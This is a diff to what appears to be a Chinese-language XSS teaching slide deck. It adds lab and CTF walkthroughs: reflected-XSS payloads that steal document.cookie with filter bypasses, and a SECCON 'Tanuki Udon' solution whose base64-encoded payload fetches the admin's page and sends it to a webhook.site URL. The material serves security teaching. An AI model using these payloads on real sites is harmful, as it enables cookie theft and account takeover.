@@ -584,7 +584,7 @@ layout: two-cols
   ```html
   <!-- Vulnerable Code -->
   <script>
-    const greeting = `Hello, ${userInput}`;
+    const greeting = `Hello, ${$userInput}`;
   </script>
 
   <!-- Payload -->
@@ -1038,7 +1038,7 @@ layout: two-cols
 - 例如，你可以在元素中添加一些样式，例如：
 
   ```html
-  <style>
+  <!-- <style>
     .test {
       position: fixed;
       top: 0;
@@ -1048,7 +1048,8 @@ layout: two-cols
       background-color: red;
       opacity: 0.5;
     }
-  </style>
+  </style> -->
+  <a style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5;"></a>
   ```
 
 ::right::
@@ -1447,3 +1448,66 @@ CSP（Content Security Policy）是一种安全机制，通过白名单的方式
 ### 其他资源
 
 - XSS Payload备忘录、Fuzzing列表等。
+
+---
+
+### 靶场：Abay XSS Labs
+
+链接：<https://xss-labs.abay.sh/xss/>
+
+请尝试完成其中 Level Easy 和 Medium 的题目（目的是 `alert(document.cookie)`）。
+
+---
+
+#### 题解：
+
+- 第一关：
+  1. 发现 Submit 按钮点不动，在 DevTools 里面手动把按钮的属性修改为 `type="submit"`。
+  2. 在搜索处提交任意内容，发现页面中会反射搜索内容，尝试提交 `<script>alert(document.cookie)</script>`，发现成功弹出。
+
+- 第二关：
+  1. 修 Submit，方法同上。
+  2. 在搜索处提交任意内容，发现搜索内容会反射在 `<input>` 的 placeholder 属性中，使用 `"><script>alert(document.cookie)</script>` 即可。
+
+- 第三关：
+  1. 修 Submit，方法同上。
+  2. 在搜索处提交任意内容，发现搜索内容会反射在 `<input>` 的 placeholder 属性中，使用上一关的 Payload 发现 `.` 被过滤。
+  3. 使用 `document['cookie']` 绕过。
+
+- 第四关：
+  1. 修 Submit，方法同上。
+  2. 在搜索处提交任意内容，发现搜索内容会反射在 `<input>` 的 placeholder 属性中，使用上一关的 Payload 发现 `alert` 被过滤。
+  3. 使用 `"><script>\u0061lert(document.cookie)</script>` 进行绕过。
+
+---
+
+### 题目：Tanuki Udon （SECCON CTF 13 Quals）
+
+请使用以下命令启动题目：
+
+```bash
+docker load -i tanuki_udon.tar
+docker run --rm -p 1337:1337 -p 3000:3000 tanuki_udon
+```
+
+端口 1337 是模仿管理员行为的 Bot 服务、3000 是题目环境。
+
+在 Bot 服务处提交 URL 后，题目环境会进行一些操作，随后加载给定 URL 的页面。
+
+请尝试找到服务中存在的 XSS 漏洞，并从管理员处窃取 flag。
+
+---
+
+#### 解题思路
+
+Markdown 解析器 Bug：
+
+```markdown
+![[aaa](bbb)](src=x onerror=eval.call`${location.search.slice`1`}` a=)
+```
+
+这个 Payload 会 eval 搜索参数中的代码，所以可以用来获取管理员和 flag 的 cookies。
+
+```text
+http://localhost:3000/note/5a4362181806f95a?eval(atob(`ZmV0Y2goIi8iKQogIC50aGVuKChyKSA9PiByLnRleHQoKSkKICAudGhlbigKICAgIChyKSA9PiAgCiAgICAgIChkb2N1bWVudC5sb2NhdGlvbiA9CiAgICAgICAgImh0dHBzOi8vd2ViaG9vay5zaXRlL2M1YmM5YWFjLWEzOTgtNDg4YS1hODAwLThjYWQ5NzlmOGIwND8iICsKICAgICAgICBlbmNvZGVVUklDb21wb25lbnQocikpCiAgKTsK`))
+```
